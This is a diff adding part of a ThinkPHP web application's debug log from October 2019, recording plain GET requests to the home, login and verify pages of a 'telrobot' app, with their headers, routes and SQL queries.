+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
+  0 => 'request',
+  1 => 'param',
+  2 => 'userAgentType',
+  3 => 'is_super',
+  4 => 'allcinfig',
+  5 => 'msgNum',
+  6 => '__menu__',
+  7 => 'meta_title',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000312s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000675s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000185s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000638s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000155s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000425s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000115s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000441s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000162s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000411s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000149s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000403s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000138s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000152s ]
+[ log ] ###user_id=time=2019-10-12 06:29:20function=user/index/login
+---------------------------------------------------------------
+[ 2019-10-12T06:29:22+08:00 ] 172.16.170.169 47.100.127.188 GET /user/index/verify
+[ info ] s-6-2111.pssdss.com/user/index/verify [运行时间：0.038801s][吞吐率：25.77req/s] [内存消耗：3,948.54kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'verify',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\common\controller\Base->verify[ /www/wwwroot/web/application/common/controller/Base.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000427s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000893s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000201s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000755s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000159s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000485s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000117s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000511s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000147s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000436s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000132s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000525s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000166s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000186s ]
+[ log ] ###user_id=time=2019-10-12 06:29:22function=user/index/verify
+---------------------------------------------------------------
+[ 2019-10-12T07:43:29+08:00 ] 172.16.170.169 106.15.201.184 GET /
+[ info ] ss-6-211.pssdss.com/ [运行时间：0.031833s][吞吐率：31.41req/s] [内存消耗：3,922.85kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => 'ss-6-211.pssdss.com',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000356s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000780s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000200s ]
+---------------------------------------------------------------
+[ 2019-10-12T07:43:29+08:00 ] 172.16.170.169 106.15.201.184 GET /user/index/login
+[ info ] ss-6-211.pssdss.com/user/index/login [运行时间：0.038661s][吞吐率：25.87req/s] [内存消耗：3,960.72kb] [文件加载：56]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => 'ss-6-211.pssdss.com',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
+  0 => 'request',
+  1 => 'param',
+  2 => 'userAgentType',
+  3 => 'is_super',
+  4 => 'allcinfig',
+  5 => 'msgNum',
+  6 => '__menu__',
+  7 => 'meta_title',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000317s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000716s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000233s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000817s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000186s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000470s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000134s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000473s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000186s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000510s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://ss-6-211.pssdss.com' LIMIT 1 [ RunTime:0.000160s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000532s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000167s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000182s ]
+[ log ] ###user_id=time=2019-10-12 07:43:29function=user/index/login
+---------------------------------------------------------------
+[ 2019-10-12T07:43:30+08:00 ] 172.16.170.169 106.15.201.184 GET /user/index/verify
+[ info ] ss-6-211.pssdss.com/user/index/verify [运行时间：0.039020s][吞吐率：25.63req/s] [内存消耗：3,948.54kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'verify',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => 'ss-6-211.pssdss.com',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\common\controller\Base->verify[ /www/wwwroot/web/application/common/controller/Base.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000342s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.001096s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000190s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000914s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000185s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000494s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000114s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000488s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000140s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000445s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://ss-6-211.pssdss.com' LIMIT 1 [ RunTime:0.000127s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000469s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000136s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000164s ]
+[ log ] ###user_id=time=2019-10-12 07:43:30function=user/index/verify
+---------------------------------------------------------------
+[ 2019-10-12T08:39:40+08:00 ] 172.16.170.169 101.251.242.238 GET /
+[ info ] 47.96.126.228:80/ [运行时间：0.034186s][吞吐率：29.25req/s] [内存消耗：3,923.59kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '47.96.126.228:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
+  'accept' => 'application/json, text/plain, */*',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000333s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000684s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000178s ]
+---------------------------------------------------------------
+[ 2019-10-12T08:43:11+08:00 ] 172.16.170.169 47.101.182.7 GET /
+[ info ] 47.96.126.228/ [运行时间：0.029341s][吞吐率：34.08req/s] [内存消耗：3,923.34kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => '47.96.126.228',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000349s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000724s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000183s ]
+---------------------------------------------------------------
+[ 2019-10-12T08:43:11+08:00 ] 172.16.170.169 47.101.182.7 GET /user/index/login
+[ info ] 47.96.126.228/user/index/login [运行时间：0.035533s][吞吐率：28.14req/s] [内存消耗：3,960.80kb] [文件加载：56]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => '47.96.126.228',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
+  0 => 'request',
+  1 => 'param',
+  2 => 'userAgentType',
+  3 => 'is_super',
+  4 => 'allcinfig',
+  5 => 'msgNum',
+  6 => '__menu__',
+  7 => 'meta_title',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000327s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000691s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000278s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000712s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000149s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000452s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000117s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000469s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000159s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000443s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228' LIMIT 1 [ RunTime:0.000156s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000436s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000137s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000173s ]
+[ log ] ###user_id=time=2019-10-12 08:43:11function=user/index/login
+---------------------------------------------------------------
+[ 2019-10-12T08:43:13+08:00 ] 172.16.170.169 47.101.182.7 GET /user/index/verify
+[ info ] 47.96.126.228/user/index/verify [运行时间：0.035572s][吞吐率：28.11req/s] [内存消耗：3,948.63kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'verify',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => '47.96.126.228',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\common\controller\Base->verify[ /www/wwwroot/web/application/common/controller/Base.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000328s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000692s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000172s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000651s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000169s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000439s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000124s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000443s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000148s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000442s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228' LIMIT 1 [ RunTime:0.000132s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000407s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000154s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000146s ]
+[ log ] ###user_id=time=2019-10-12 08:43:13function=user/index/verify
+---------------------------------------------------------------
+[ 2019-10-12T10:37:56+08:00 ] 172.16.170.169 196.202.194.147 GET /
+[ info ] 47.96.126.228:80/ [运行时间：0.031276s][吞吐率：31.97req/s] [内存消耗：3,922.77kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '47.96.126.228:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000373s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000742s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000175s ]
+---------------------------------------------------------------
+[ 2019-10-12T11:22:01+08:00 ] 172.16.170.169 183.253.48.152 GET /
+[ info ] s-6-2111.pssdss.com/ [运行时间：0.032134s][吞吐率：31.12req/s] [内存消耗：3,924.39kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'cookie' => 'UM_distinctid=16bbad4500f52b-099d6fae8cae9-3c604504-100200-16bbad45010583',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000390s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000794s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000215s ]
+---------------------------------------------------------------
+[ 2019-10-12T11:22:01+08:00 ] 172.16.170.169 183.253.48.152 GET /user/index/login
+[ info ] s-6-2111.pssdss.com/user/index/login [运行时间：0.037801s][吞吐率：26.45req/s] [内存消耗：3,962.55kb] [文件加载：56]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'cookie' => 'UM_distinctid=16bbad4500f52b-099d6fae8cae9-3c604504-100200-16bbad45010583; PHPSESSID=sb18enngn6in9tm2bnvfpfvv54',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
+  0 => 'request',
+  1 => 'param',
+  2 => 'userAgentType',
+  3 => 'is_super',
+  4 => 'allcinfig',
+  5 => 'msgNum',
+  6 => '__menu__',
+  7 => 'meta_title',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000341s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000798s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000229s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000717s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000153s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000549s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000117s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000526s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000145s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000489s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000151s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000483s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000166s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000172s ]
